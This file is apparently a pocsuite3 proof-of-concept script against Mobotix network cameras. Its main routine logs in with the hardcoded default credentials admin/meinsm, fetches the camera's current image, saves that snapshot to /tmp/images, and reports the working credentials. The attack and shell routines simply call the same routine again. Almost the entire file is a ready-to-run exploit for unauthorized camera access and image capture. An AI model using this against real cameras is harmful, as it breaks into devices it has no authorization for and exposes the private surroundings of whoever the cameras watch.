#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pocsuite3.api import (
     POCBase, register_poc, requests, logger,
    OptString,
    random_str,
)
import base64
import requests
from urllib.parse import urljoin,urlparse
import os


class DemoPOC(POCBase):
    vulID = 'xxx'
    version = '1'
    author = 'xxx'
    vulDate = 'xxx'
    createDate = '2023-03-27'
    updateDate = '2023-03-27'
    references = ['xxx']
    name = 'Mobotix_camera_login'
    appPowerLink = 'xxx'
    appName = 'Mobotix'
    appVersion = 'xxx'
    vulType = 'Login Bypass'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''

    def _verify(self):

        creds = {'Username': 'admin', 'password': 'meinsm'}
        str_encode = str.encode(creds['Username'] + ':' + creds['password'])
        b64_login = str(base64.b64encode(str_encode), 'utf-8')
        # 登陆信息
        payload = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Authorization': f'Basic {b64_login}'
        }
        # 视频页"/control/userimage.html"
        # 获取当前画面图片'image/jpeg'
        url = urljoin(self.url, '/record/current.jpg')
        res = requests.get(url, headers=payload, verify=False)
        #可能存在无法登陆后台，但是可以未授权获取到当前摄像头的图片
        if res.status_code == 200 and res.headers['Content-type'] == 'image/jpeg':
            parsed = urlparse(res.url)
            image_dir = f"/tmp/images/"
            if not os.path.exists(image_dir):
                os.makedirs(image_dir)
            filename = os.path.join(image_dir, f"{parsed.netloc.replace(':', '_')}") + '.jpg'
            with open(filename, 'wb') as f:
                f.write(res.content)
                logger.info("save snapshot to {}".format(filename))
                result = {}
                param = ''
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo'][param] = creds
                return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
